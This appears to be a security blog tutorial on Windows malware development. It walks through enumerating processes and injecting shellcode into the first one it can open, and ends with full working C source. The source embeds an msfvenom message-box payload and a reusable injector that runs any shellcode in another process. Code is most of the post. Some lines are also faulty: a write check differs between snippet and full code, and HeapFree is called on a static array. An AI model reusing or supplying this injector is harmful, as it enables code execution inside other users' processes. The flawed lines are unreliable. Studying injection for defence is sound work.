+++
date = '2024-11-26T05:16:19+02:00'
draft = false
title = 'Malware Development - Remote Procces Enumeration And Injection - Shellcode'
+++

## Intro
---

This post is about enumerating processes on a Windows system and finding a target process to inject shellcode into. The program or ... "malware", has two basic functions. `GetProcessHandle` which will do the process enumeration and open a handle to the first valid process, and `InjectShellcode` which will inject a simple messagebox payload to the retrieved process handle.

## Process Enumeration using EnumProcesses
---

For the process enumeration the `EnumProcesses` from `Psapi.h` will be used. The function retrieves the PIDs for each process object in the system.

```c
BOOL EnumProcesses(
  [out] DWORD   *lpidProcess, // A pointer to an array that receives the list of PIDs.
  [in]  DWORD   cb, // The size of the pProcessIds array, in bytes.
  [out] LPDWORD lpcbNeeded // The number of bytes returned in the pProcessIds array.
);
```

Microsoft's documentation states:

*"It is a good idea to use a large array, because it is hard to predict how many processes there will be at the time you call EnumProcesses.*

*To determine how many processes were enumerated, divide the lpcbNeeded value by sizeof(DWORD). There is no indication given when the buffer is too small to store all process identifiers. Therefore, if lpcbNeeded equals cb, consider retrying the call with a larger array."*


## Enumerating processes and getting a handle
---

Our `GetProcessHandle` function will take one argument, `*phProcess`, which will be a pointer to a retrieved process handle. The function will then call `EnumProcesses` to enumerate the PIDs on the system and save them in the `aProcesses` array. Using a `do while` loop, `GetProcessHandle` will try to get a handle using the `OpenProcess` function. The loop exits when a handle is successfully retrieved, or when we run out of PIDs in the `aProcesses` array.

```c
int i = 0;
do {
	if (aProcesses[i] != NULL) {
		printf("[+] Trying to open a handle to PID: %d ... \n", aProcesses[i]);
		if ((hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, aProcesses[i])) != NULL) {
			printf("[+] Handle opened for PID: %d\n", aProcesses[i]);
			bStatus = TRUE;
			*phProcess = hProcess; // Return handle by reference
		}
	}
	i++;
} while (i < dwProcessesCount && *phProcess == NULL);
```


## The OpenProcess Function
---

Bellow is the function's syntax, as show in Microsoft's documentation:

```c
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,  // The access to the process object.
  [in] BOOL  bInheritHandle,   // If TRUE, created processes inherit from this process
  [in] DWORD dwProcessId       // The identifier of the local process to be opened.
);
```

In the `do while` example above, the `dwDesiredAccess` parameter is set to `PROCESS_VM_WRITE | PROCESS_VM_OPERATION`, which are required to later allocate memory and operate on the target process and  write our shellcode.

We could also use `PROCESS_ALL_ACCESS`, which will give us all possible access rights, and the function call would look like the following:

```c
if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, aProcesses[i])) != NULL) {
	// ...
}
```


## Injecting Shellcode to Remote Process
---

For the injection part of the malware, `InjectShellcode` will utilize commonly used functions for a standard remote process injection and will take as parameters a handle to a process (`HANDLE hProcess`), a pointer to our shellcode buffer (`PBYTE pShellcode`) and the size of the shellcode (`SIZE_T sSizeOfShellcode`).

The steps for the injection are:
1. Allocating memory to the remote process for writing the shellcode using `VirtualAllocEx`. We set the protection parameter to `PAGE_READWRITE` since we're only reading/writing to that memory region.

2. Using `WriteProcessMemory` we write to that remote process using it's handle, `hProcess` and cleaning the shellcode from our local process by overwriting the buffer with `0`s using `memset`.

3. To run the shellcode, we make the allocated buffer of the remote process executable by setting the protection to `PAGE_EXECUTE_READ` for the `VirtualProtectEx` function.

4. Finally, we use `CreateRemoteThread` to launch the shellcode, as well as using the `WaitForSingleObject` function to make sure the main thread doesn't exit before the shellcode gets executed.



```c
BOOL InjectShellcode(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

	printf("[+] Starting Shellcode injection ... \n");

	PVOID   pShellcodeAddress  = NULL;
	DWORD   dwOldProtection    = NULL;
	SIZE_T  sBytesWritten      = NULL;
	HANDLE  hThread            = NULL;

	printf("[+] Allocating memory of size %d to remote process ... \n", sSizeOfShellcode);
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (pShellcodeAddress != NULL) {
		printf("[+] Trying to write shellcode to allocated memory at: 0x%p\n", pShellcodeAddress);

		if (WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sBytesWritten) || sBytesWritten != sSizeOfShellcode) {
			printf("[+] Wrote %d bytes. Cleaning the shellcode from the local process ...\n", sBytesWritten);
			memset(pShellcode, '\0', sSizeOfShellcode);
			printf("[+] Trying to make the memory region executable ... \n");

			if (VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
				printf("[+] Launching the shellcode in a new thread ... \n");
				hThread = CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);

				if (hThread != NULL) {
					printf("[+] Waiting 2000 ms for thread execution ... \n");
					WaitForSingleObject(hThread, 2000);
					return TRUE;
				} 
			}
		}
	}

	return FALSE;
}
```

If at any point a function fails, `InjectShellcode` returns `FALSE`, otherwise it returns `TRUE`.


## Demo and Analysis
---

A simple `windows/x64/messagebox` payload from `msfvenom` will be used for the demo. When running the our executable, we see the messagebox pop up

![](/attachments/proc-enum-inject/gif1212312312312312.gif)

We also see the PID `4668` of the process where the shellcode was injected. We can check that PID on System Informer and see that the process is `sihost.exe`

![](/attachments/proc-enum-inject/Pasted%20image%2020241126070640.png)


When inspecting the memory of `sihost.exe` at the address `0x0000022D34320000` which we got from the output of our malware, we can see the `msfvenom` message box payload.

![](/attachments/proc-enum-inject/Pasted%20image%2020241126071137.png)


## Remote Process Enumeration and Injection - Full Code
---

Bellow is the full code of the "malware".

```c
/*
	Remote Process Enumeration and Injection with messagebox shellcode
	Date: 25/11/2024
	Author: T0nyC
*/

#include <windows.h>
#include <stdio.h>
#include <Psapi.h> // required to use EnumProcesses

// msfvenom windows/x64/messagebox payload
// msfvenom -p windows/x64/messagebox EXITFUNC=thread --var-name shellcode -f c
unsigned char shellcode[] =
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
	"\x8d\x8d\x46\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
	"\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x2a\x01\x00"
	"\x00\x3e\x4c\x8d\x85\x3b\x01\x00\x00\x48\x31\xc9\x41\xba"
	"\x45\x83\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6"
	"\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80"
	"\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
	"\xda\xff\xd5\x48\x65\x6c\x6c\x6f\x2c\x20\x66\x72\x6f\x6d"
	"\x20\x4d\x53\x46\x21\x00\x4d\x65\x73\x73\x61\x67\x65\x42"
	"\x6f\x78\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00";

BOOL InjectShellcode(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

	printf("[+] Starting Shellcode injection ... \n");

	PVOID   pShellcodeAddress  = NULL;  // Pointer to the remotelly allocated buffer
	DWORD   dwOldProtection    = NULL;  // Will hold the old protection retrieved from VirtualProtectEx
	SIZE_T  sBytesWritten      = NULL;  // Will hold the number of bytes written from WriteProcessMemory
	HANDLE  hThread            = NULL;  // Handle to the thraed that lunches the shellcode.

	printf("[+] Allocating memory of size %d to remote process ... \n", sSizeOfShellcode);
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (pShellcodeAddress != NULL) {
		printf("[+] Trying to write shellcode to allocated memory at: 0x%p\n", pShellcodeAddress);

		// If WriteProcessMemory succeeds and the size of bytes written is the same as the size of the shellcode
		if (WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sBytesWritten) && sBytesWritten == sSizeOfShellcode) {
			printf("[+] Wrote %d bytes. Cleaning the shellcode from the local process ...\n", sBytesWritten);
			// Clean up the shellcode from the local process by overwriting it with 0s
			memset(pShellcode, '\0', sSizeOfShellcode);

			printf("[+] Trying to make the memory region executable ... \n");
			if (VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
				printf("[+] Launching the shellcode in a new thread ... \n");
				hThread = CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);

				if (hThread != NULL) {
					printf("[+] Waiting 2000 ms for thread execution ... \n");
					// Waiting for 2000ms to prevent the main thread from exiting before the shellcode completely executes.
					WaitForSingleObject(hThread, 2000);
					return TRUE;
				} 
			}
		}
	}

	// If any function above fails return FALSE
	return FALSE;
}

BOOL GetProcessHandle(OUT HANDLE *phProcess) {

	printf("[+] Starting process enumeration ... \n");

	DWORD aProcesses         [1024 * 2];  // Array that will receive the list of PIDs
	DWORD dwReturnedBytes    = NULL;      // The number of bytes returned in the aProcesses array
	DWORD dwProcessesCount   = NULL;      // Will hold the number of PIDs returned in aProcesses
	HANDLE hProcess          = NULL;      // Will hold a handle to a target process
	BOOL bStatus             = FALSE; 
	
	// Get the array of PIDs in the system
	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &dwReturnedBytes)) {
		printf("EnumProcesses failed with error: %d\n", GetLastError());
		return bStatus;
	}

	// Calculatiing the number of elements in the array
	dwProcessesCount = dwReturnedBytes / sizeof(DWORD);
	printf("Number of processes: %d\n", dwProcessesCount);

	int i = 0;
	do {
		if (aProcesses[i] != NULL) {
			printf("[+] Trying to open a handle to PID: %d ... \n", aProcesses[i]);

			// Desired access rights:
			//     PROCESS_VM_WRITE      -> Required to write to memory in a process using WriteProcessMemory
			//     PROCESS_VM_OPERATION  -> Required to perform an operation on the process (VirtualProtectEx)
			// Or use PROCESS_ALL_ACCESS
			if ((hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, aProcesses[i])) != NULL) {
				printf("[+] Handle opened for PID: %d\n", aProcesses[i]);
				bStatus = TRUE;
				*phProcess = hProcess; // Return handle by reference
			}
		}
		i++;
	
	} while (i < dwProcessesCount && *phProcess == NULL);

	return bStatus;
}

int main() {

	HANDLE hProcess = NULL; // Will hold a process handle retrieved from GetProcessHandle

	// If GetProcessHandle Succeeds, try and inject the shellcode
	if (GetProcessHandle(&hProcess)) {
		// If InjectShellcode fails, print the last error code and exit
		if (!InjectShellcode(hProcess, shellcode, sizeof(shellcode))) {
			printf("[!] Something went wrong. Last error is: %d\n", GetLastError());
			return -1; 
		}
	}

	// Free the shellcode buffer
	HeapFree(GetProcessHeap(), 0, shellcode);
	// Close the handle
	CloseHandle(hProcess);
	return 0;
}
```


## WinAPIs and Usefull Readings
---

- [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
- [EnumProcesses](https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses)
- [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
- [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
- [VirtualProtectEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex)
- [CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)
- [HeapFree](https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapfree)
- [GetProcessHeap](https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-getprocessheap)
- [WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)
- [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
- [System Error Codes](https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes)
- [Process Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)


